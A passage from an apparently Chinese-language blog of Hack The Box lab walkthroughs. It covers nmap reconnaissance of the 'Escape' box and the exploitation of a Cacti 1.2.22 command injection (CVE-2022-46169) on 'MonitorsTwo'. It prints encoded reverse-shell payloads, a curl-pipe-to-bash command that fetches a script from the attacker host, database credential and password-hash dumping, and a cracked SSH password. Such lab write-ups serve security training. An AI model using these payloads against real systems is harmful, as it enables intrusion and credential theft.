<h2 id="2-Escape"><a href="#2-Escape" class="headerlink" title="2.Escape"></a>2.Escape</h2><h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="http://t.csdn.cn/xUqAI">http://t.csdn.cn/xUqAI</a></p>
<p><a href="https://www.bilibili.com/video/BV12k4y1J7zE/?spm_id_from=333.337.search-card.all.click&vd_source=c49e37118f69c7a5b34915b73d1b78ab">hackthebox中等难度靶场escape渗透全过程_哔哩哔哩_bilibili</a></p>
<p>nmap:</p>
<p><code>nmap -p- -sT --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>参数解释：</p>
<p>-p- 所有端口</p>
<p>-sT TCP连接</p>
<p>–min-rate&#x3D;1000 1秒发送1000个请求</p>
<p>-Pn 禁用主机发现</p>
<p>结果为：</p>
<p>53&#x2F;tcp    open  domain<br>88&#x2F;tcp    open  kerberos-sec<br>135&#x2F;tcp   open  msrpc<br>139&#x2F;tcp   open  netbios-ssn<br>389&#x2F;tcp   open  ldap<br>445&#x2F;tcp   open  microsoft-ds<br>464&#x2F;tcp   open  kpasswd5<br>593&#x2F;tcp   open  http-rpc-epmap<br>636&#x2F;tcp   open  ldapssl<br>3269&#x2F;tcp  open  globalcatLDAPssl<br>9389&#x2F;tcp  open  adws<br>49667&#x2F;tcp open  unknown<br>49687&#x2F;tcp open  unknown<br>49705&#x2F;tcp open  unknown<br>49711&#x2F;tcp open  unknown</p>
</blockquote>
<p><code>nmap -p- -sU --min-rate=1000 -Pn 10.10.11.202</code></p>
<blockquote>
<p>PORT    STATE SERVICE<br>53&#x2F;udp  open  domain<br>123&#x2F;udp open  ntp</p>
</blockquote>
<p>vim port.txt，将nmap中tcp扫描到的内容复制过去，通过正则过滤拼接出需要的端口号。提取每行”&#x2F;“之前的内容，再拼接即可</p>
<p>awk -F’&#x2F;‘ ‘{print $1}’  ORS&#x3D;’,’  port.txt  | tr -d ‘,’</p>
<blockquote>
<ol>
<li><p><code>awk</code>命令：<code>awk</code>是一个文本处理工具，用于按照指定的规则对文本进行处理。它按行读取输入，并根据给定的规则执行操作。</p>
</li>
<li><p><code>-F&#39;/&#39;</code>：<code>-F</code>选项用于指定字段分隔符。在这个命令中，我们将字段分隔符设置为斜杠（&#x2F;），以便将每行拆分为多个字段。</p>
</li>
<li><p><code>&#39;&#123;print $1&#125;&#39;</code>：这是一个<code>awk</code>的操作部分，指定要执行的操作。<code>$1</code>表示打印第一个字段。</p>
</li>
<li><p>默认情况下，<code>ORS</code>的值是一个换行符（<code>\n</code>），这意味着每个<code>print</code>语句打印的内容将以换行符分隔。但是，您可以通过修改<code>ORS</code>的值来指定不同的分隔符。</p>
</li>
</ol>
<p>  在这种情况下，我们使用<code>ORS=&#39;,&#39;</code>将<code>ORS</code>设置为逗号（<code>,</code>）。这样，当<code>print</code>语句执行时，它将使用逗号作为记录之间的分隔符，而不是默认的换行符。这样就实现了将提取的端口号使用逗号拼接在一起的效果。</p>
<p>  结果为：</p>
<p>  53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711, </p>
</blockquote>
<p><code>nmap -p53,88,135,139,389,445,464,593,636,3269,9389,49667,49687,49705,49711 -Pn -sT -sC -sV 10.10.11.202</code></p>
<blockquote>
<ul>
<li><code>-sC</code>：这个参数指定在扫描期间运行默认的Nmap脚本。Nmap脚本是一组自动化的测试和攻击脚本，用于探测和利用目标主机上的漏洞或服务配置问题。</li>
<li><code>-sV</code>：这个参数指定在扫描期间进行版本探测。<code>nmap</code>将尝试识别目标主机上运行的服务和应用程序的版本信息。通过识别版本信息，可以更好地了解目标主机上的系统配置和潜在的安全风险。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time:------)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">|_ssl-date: 2023-06-07T21:55:16+00:00; +8h00m00s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: ------T21:55:17+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: -----T21:55:19+00:00; +8h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb</span><br><span class="line">| Not valid before: 2022-11-18T21:20:35</span><br><span class="line">|_Not valid after:  2023-11-18T21:20:35</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: -------T21:54:38</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现域名sequel.htb与子域名dc.sequel.htb</p>
<h2 id="3-MonitorsTwo-版本漏洞"><a href="#3-MonitorsTwo-版本漏洞" class="headerlink" title="3.MonitorsTwo(版本漏洞)"></a>3.MonitorsTwo(版本漏洞)</h2><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_64201116/article/details/130957041?ops_request_misc=%7B%22request_id%22:%22168749798516800211583630%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168749798516800211583630&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-130957041-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=MonitorsTwo&spm=1018.2226.3001.4187">HTB MonitorsTwo_清风–的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43264813/article/details/130860974?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-0-130860974-blog-130957041.235%5Ev38%5Epc_relevant_sort_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">HackTheBox系列-MonitorsTwo_夜白君的博客-CSDN博客</a></p>
<h3 id="1-扫描端口"><a href="#1-扫描端口" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p><code>nmap -Pn 10.10.11.211 </code></p>
<blockquote>
<p>22和80</p>
</blockquote>
<p>访问</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621162319430.png"></p>
<p>这是一个Cacti的框架 Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>抓个包</p>
<blockquote>
<p>POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 143<br>Origin: <a href="http://10.10.11.211/">http://10.10.11.211</a><br>Connection: close<br>Referer: <a href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a><br>Cookie: Cacti&#x3D;23c13c8cedf59e7ab5692967d58edba1; CactiDateTime&#x3D;Wed Jun 21 2023 16:26:22 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480<br>Upgrade-Insecure-Requests: 1</p>
<p>__csrf_magic&#x3D;sid%3A85cdbc25916003d0deb870cb3312ad1f4dbe3b51%2C1687335980&amp;action&#x3D;login&amp;login_username&#x3D;admin123&amp;login_password&#x3D;123&amp;remember_me&#x3D;on</p>
</blockquote>
<p>没看出来。</p>
<p>dirb扫描路径</p>
<blockquote>
<p>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/docs/">http://10.10.11.211/docs/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/images/">http://10.10.11.211/images/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/include/">http://10.10.11.211/include/</a>                                                                 </p>
<ul>
<li><a href="http://10.10.11.211/index.php">http://10.10.11.211/index.php</a> (CODE:200|SIZE:13844)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/install/">http://10.10.11.211/install/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/lib/">http://10.10.11.211/lib/</a>                                                                     </li>
<li><a href="http://10.10.11.211/LICENSE">http://10.10.11.211/LICENSE</a> (CODE:200|SIZE:15171)                                                         </li>
<li><a href="http://10.10.11.211/log">http://10.10.11.211/log</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/plugins/">http://10.10.11.211/plugins/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/resource/">http://10.10.11.211/resource/</a><br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/scripts/">http://10.10.11.211/scripts/</a>                                                                 </li>
<li><a href="http://10.10.11.211/server-status">http://10.10.11.211/server-status</a> (CODE:403|SIZE:276)<br>&#x3D;&#x3D;&gt; DIRECTORY: <a href="http://10.10.11.211/service/">http://10.10.11.211/service/</a></li>
</ul>
<p>—- Entering directory: <a href="http://10.10.11.211/cache/">http://10.10.11.211/cache/</a> —-</p>
<ul>
<li><a href="http://10.10.11.211/cache/index.php">http://10.10.11.211/cache/index.php</a> (CODE:302|SIZE:0)</li>
</ul>
</blockquote>
<p>没什么用</p>
<h3 id="2-版本漏洞"><a href="#2-版本漏洞" class="headerlink" title="2.版本漏洞"></a>2.版本漏洞</h3><p>回过头看看版本信息Version 1.2.22 | (c) 2004-2023 - The Cacti Group</p>
<p>谷歌一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230621201847673.png"></p>
<p>命令注入漏洞 (CVE-2022-46169)<a href="https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/">https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/</a></p>
<p>以下有两种做法，做法1，我的没实现成功；成功的是做法2。</p>
<h4 id="做法1："><a href="#做法1：" class="headerlink" title="做法1："></a>做法1：</h4><p>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;<code>bash+-c+&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br><code>bash -i &gt;&amp; /dev/tcp/10.10.14.96/1234 0&gt;&amp;1 //这个是攻击机的地址</code></p>
<blockquote>
<p>base64后：</p>
<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;</p>
</blockquote>
<p><a href="https://www.bilibili.com/video/BV1Dk4y1E7kf/">Hack The Box 赛季活动靶场【MonitorsTwo】User&amp;System Flag攻略_哔哩哔哩_bilibili</a></p>
<p>构造这个</p>
<blockquote>
<p><strong>GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`bash+-c+”{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Ni8xMjM0IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”&#96; HTTP&#x2F;1.1</strong><br><strong>X-Forwarded-For: 127.0.0.1</strong><br>Host: 10.10.11.211<br>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:102.0) Gecko&#x2F;20100101 Firefox&#x2F;102.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: CactiDateTime&#x3D;Wed Jun 21 2023 22:26:48 GMT+0800 (China Standard Time); CactiTimeZone&#x3D;480; Cacti&#x3D;662c23c759cac6c538f02c2d2cb02919<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>repeater发送之前，nc监听</p>
<p>nc -lvnp 1234，但是，没反应。</p>
<h4 id="做法2："><a href="#做法2：" class="headerlink" title="做法2："></a>做法2：</h4><p>换一条路。</p>
<p>下载以下地址的py文件。</p>
<p><a href="https://github.com/sAsPeCt488/CVE-2022-46169/blob/main/CVE-2022-46169.py">CVE-2022-46169&#x2F;CVE-2022-46169.py at main · sAsPeCt488&#x2F;CVE-2022-46169 (github.com)</a></p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# vim 1234.sh</p>
<p>┌──(root㉿kali)-[~]<br>└─# cat 1234.sh<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.96&#x2F;1234 0&gt;&amp;1</p>
</blockquote>
<p>python3 CVE-2022-46169.py <a href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl 10.10.14.96&#x2F;1234.sh|bash</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a href="http://10.10.14.96/">http://10.10.14.96</a>“<br>[*] Trying for 1 - 100 host ids<br>[+] Exploit Completed for host_id &#x3D; 1</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python -m http.server 80 </p>
<p>10.10.11.211 - - [21&#x2F;Jun&#x2F;2023 23:49:57] “GET &#x2F; HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<blockquote>
<p>新开窗口，nc -lvnp 1234</p>
</blockquote>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# python3 CVE-2022-46169.py <a href="http://10.10.11.211/">http://10.10.11.211</a> -c “curl <a href="http://10.10.14.96/1234.sh">http://10.10.14.96/1234.sh</a> | <strong>&#x2F;bin&#x2F;bash</strong>“<br>[*] Trying for 1 - 100 host ids</p>
</blockquote>
<p>查看监听窗口</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# nc -lvnp 1234<br>listening on [any] 1234 …<br>connect to [10.10.14.96] from (UNKNOWN) [10.10.11.211] 54714<br>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br>bash: no job control in this shell<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ </p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ ls -a<br>ls -a<br>.<br>..<br>.mdl_style.rb<br>.mdlrc<br>.rnd<br>CHANGELOG<br>LICENSE<br>README.md<br>about.php<br>aggregate_graphs.php<br>aggregate_items.php<br>aggregate_templates.php<br>auth_changepassword.php<br>auth_login.php<br>auth_profile.php<br>automation_devices.php<br>automation_graph_rules.php<br>automation_networks.php<br>automation_snmp.php<br>automation_templates.php<br>automation_tree_rules.php<br>boost_rrdupdate.php<br>cache<br>cacti.sql<br>cactid.php<br>cdef.php<br>cli<br>clog.php<br>clog_user.php<br>cmd.php<br>cmd_realtime.php<br>color.php<br>color_templates.php<br>color_templates_items.php<br>data_debug.php<br>data_input.php<br>data_queries.php<br>data_source_profiles.php<br>data_sources.php<br>data_templates.php<br>docs<br>formats<br>gprint_presets.php<br>graph.php<br>graph_image.php<br>graph_json.php<br>graph_realtime.php<br>graph_templates.php<br>graph_templates_inputs.php<br>graph_templates_items.php<br>graph_view.php<br>graph_xport.php<br>graphs.php<br>graphs_items.php<br>graphs_new.php<br>help.php<br>host.php<br>host_templates.php<br>images<br>include<br>index.php<br>install<br>lib<br>link.php<br>links.php<br>locales<br>log<br>logout.php<br>managers.php<br>mibs<br>permission_denied.php<br>plugins<br>plugins.php<br>poller.php<br>poller_automation.php<br>poller_boost.php<br>poller_commands.php<br>poller_dsstats.php<br>poller_maintenance.php<br>poller_realtime.php<br>poller_recovery.php<br>poller_reports.php<br>poller_spikekill.php<br>pollers.php<br>remote_agent.php<br>reports_admin.php<br>reports_user.php<br>resource<br>rra<br>rrdcleaner.php<br>script_server.php<br>scripts<br>service<br>service_check.php<br>settings.php<br>sites.php<br>snmpagent_mibcache.php<br>snmpagent_mibcachechild.php<br>snmpagent_persist.php<br>spikekill.php<br>templates_export.php<br>templates_import.php<br>tree.php<br>user_admin.php<br>user_domains.php<br>user_group_admin.php<br>utilities.php<br>vdef.php</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html$ cd include<br>cd include<br>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ ls<br>ls<br>auth.php<br>bottom_footer.php<br>cacti_version<br>cli_check.php<br>config.php<br>content<br>csrf.php<br>fa<br>fonts<br>global.php<br>global_arrays.php<br>global_constants.php<br>global_form.php<br>global_languages.php<br>global_session.php<br>global_settings.php<br>index.php<br>js<br>layout.js<br>plugins.php<br>realtime.js<br>session.php<br>themes<br>top_general_header.php<br>top_graph_header.php<br>top_header.php<br>vendor</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ cat config.php<br>cat config.php<br>&lt;?php<br>&#x2F;*<br> +————————————————————————-+<br> | Copyright (C) 2004-2020 The Cacti Group                                 |<br> |                                                                         |<br> | This program is free software; you can redistribute it and&#x2F;or           |<br> | modify it under the terms of the GNU General Public License             |<br> | as published by the Free Software Foundation; either version 2          |<br> | of the License, or (at your option) any later version.                  |<br> |                                                                         |<br> | This program is distributed in the hope that it will be useful,         |<br> | but WITHOUT ANY WARRANTY; without even the implied warranty of          |<br> | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |<br> | GNU General Public License for more details.                            |<br> +————————————————————————-+<br> | Cacti: The Complete RRDtool-based Graphing Solution                     |<br> +————————————————————————-+<br> | This code is designed, written, and maintained by the Cacti Group. See  |<br> | about.php and&#x2F;or the AUTHORS file for specific developer information.   |<br> +————————————————————————-+<br> | <a href="http://www.cacti.net/">http://www.cacti.net/</a>                                                   |<br> +————————————————————————-+<br>*&#x2F;</p>
<p>&#x2F;*</p>
<ul>
<li>Make sure these values reflect your actual database&#x2F;host&#x2F;user&#x2F;password<br> *&#x2F;</li>
</ul>
<p>$database_type     &#x3D; ‘mysql’;<br>$database_default  &#x3D; ‘cacti’;<br>$database_hostname &#x3D; ‘db’;<br>$database_username &#x3D; ‘root’;<br>$database_password &#x3D; ‘root’;<br>$database_port     &#x3D; ‘3306’;<br>$database_retries  &#x3D; 5;<br>$database_ssl      &#x3D; false;<br>$database_ssl_key  &#x3D; ‘’;<br>$database_ssl_cert &#x3D; ‘’;<br>$database_ssl_ca   &#x3D; ‘’;<br>$database_persist  &#x3D; false;</p>
</blockquote>
<blockquote>
<p>define(‘DEBUG_SQL_FLOW’, true);www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root -e “show databases;”</strong></p>
<p>&lt;db –user&#x3D;root –password&#x3D;root -e “show databases;”<br>Database<br>information_schema<br>cacti<br>mysql<br>performance_schema<br>sys</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “show tables;”</strong><br>&lt;–user&#x3D;root –password&#x3D;root cacti -e “show tables;”<br>Tables_in_cacti<br>aggregate_graph_templates<br>aggregate_graph_templates_graph<br>aggregate_graph_templates_item<br>aggregate_graphs<br>aggregate_graphs_graph_item<br>aggregate_graphs_items<br>automation_devices<br>automation_graph_rule_items<br>automation_graph_rules<br>automation_ips<br>automation_match_rule_items<br>automation_networks<br>automation_processes<br>automation_snmp<br>automation_snmp_items<br>automation_templates<br>automation_tree_rule_items<br>automation_tree_rules<br>cdef<br>cdef_items<br>color_template_items<br>color_templates<br>colors<br>data_debug<br>data_input<br>data_input_data<br>data_input_fields<br>data_local<br>data_source_profiles<br>data_source_profiles_cf<br>data_source_profiles_rra<br>data_source_purge_action<br>data_source_purge_temp<br>data_source_stats_daily<br>data_source_stats_hourly<br>data_source_stats_hourly_cache<br>data_source_stats_hourly_last<br>data_source_stats_monthly<br>data_source_stats_weekly<br>data_source_stats_yearly<br>data_template<br>data_template_data<br>data_template_rrd<br>external_links<br>graph_local<br>graph_template_input<br>graph_template_input_defs<br>graph_templates<br>graph_templates_gprint<br>graph_templates_graph<br>graph_templates_item<br>graph_tree<br>graph_tree_items<br>host<br>host_graph<br>host_snmp_cache<br>host_snmp_query<br>host_template<br>host_template_graph<br>host_template_snmp_query<br>plugin_config<br>plugin_db_changes<br>plugin_hooks<br>plugin_realms<br>poller<br>poller_command<br>poller_data_template_field_mappings<br>poller_item<br>poller_output<br>poller_output_boost<br>poller_output_boost_local_data_ids<br>poller_output_boost_processes<br>poller_output_realtime<br>poller_reindex<br>poller_resource_cache<br>poller_time<br>processes<br>reports<br>reports_items<br>sessions<br>settings<br>settings_tree<br>settings_user<br>settings_user_group<br>sites<br>snmp_query<br>snmp_query_graph<br>snmp_query_graph_rrd<br>snmp_query_graph_rrd_sv<br>snmp_query_graph_sv<br>snmpagent_cache<br>snmpagent_cache_notifications<br>snmpagent_cache_textual_conventions<br>snmpagent_managers<br>snmpagent_managers_notifications<br>snmpagent_mibs<br>snmpagent_notifications_log<br><strong>user_auth</strong><br>user_auth_cache<br>user_auth_group<br>user_auth_group_members<br>user_auth_group_perms<br>user_auth_group_realm<br>user_auth_perms<br>user_auth_realm<br>user_domains<br>user_domains_ldap<br>user_log<br>vdef<br>vdef_items<br>version</p>
</blockquote>
<blockquote>
<p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “select * from user_auth;”</strong></p>
</blockquote>
<blockquote>
<p>&lt;–password&#x3D;root cacti -e “select * from user_auth;”<br>id      username        password        realm   full_name       email_address   must_change_password    password_change      show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphspolicy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history     locked  failed_attempts lastfail        reset_perms<br>1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#109;&#111;&#x6e;&#x69;&#x74;&#111;&#x72;&#115;&#116;&#x77;&#x6f;&#x2e;&#104;&#x74;&#98;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#109;&#111;&#x6e;&#x69;&#x74;&#111;&#x72;&#115;&#116;&#x77;&#x6f;&#x2e;&#104;&#x74;&#98;</a>                on      on      on      on      on      2       1       1       1       1   on       -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on  31       1       1       1       1               -1      -1      -1              0       0       0<br>4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#x6d;&#97;&#x72;&#x63;&#117;&#x73;&#x40;&#x6d;&#x6f;&#x6e;&#x69;&#x74;&#111;&#114;&#x73;&#116;&#119;&#111;&#46;&#x68;&#x74;&#x62;">&#x6d;&#97;&#x72;&#x63;&#117;&#x73;&#x40;&#x6d;&#x6f;&#x6e;&#x69;&#x74;&#111;&#114;&#x73;&#116;&#119;&#111;&#46;&#x68;&#x74;&#x62;</a>                       on      on      on      on      1       1       1       1       1   on       -1      -1              on      0       0       2135691668</p>
</blockquote>
<p>密码都是哈希过的</p>
<p>用hashcat反解$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC的明文</p>
<p>解出来后得到密码</p>
<h3 id="3-ssh连接"><a href="#3-ssh连接" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p>然后ssh连接</p>
<p><code>ssh marcus@monitorstwo.htb </code></p>
<p>如果提示找不到</p>
<p><code>vim /etc/hosts</code> 添加</p>
<p> 10.10.11.211 monitorstwo.htb即可</p>
<p><strong>funkymonkey.</strong></p>
<h3 id="4-cat-user-txt"><a href="#4-cat-user-txt" class="headerlink" title="4.cat user.txt"></a>4.cat user.txt</h3><p>获取到flag。</p>
<h3 id="获取root-txt"><a href="#获取root-txt" class="headerlink" title="获取root.txt"></a>获取root.txt</h3><p>我没成功</p>
<h3 id="5-findmnt"><a href="#5-findmnt" class="headerlink" title="5.findmnt"></a>5.findmnt</h3><p><code>findmnt</code>&#x2F;&#x2F;显示当前挂载命令</p>
<blockquote>
<pre><code>                                            nsfs      rw
</code></pre>
<p>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;75<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69&#x2F;mounts&#x2F;shm<br>│                                     shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k<br>├─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>│                                     overlay    overlay   rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4Z<br>└─&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers&#x2F;50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e&#x2F;mounts&#x2F;shm<br>                                      shm        tmpfs     rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k</p>
</blockquote>
<blockquote>
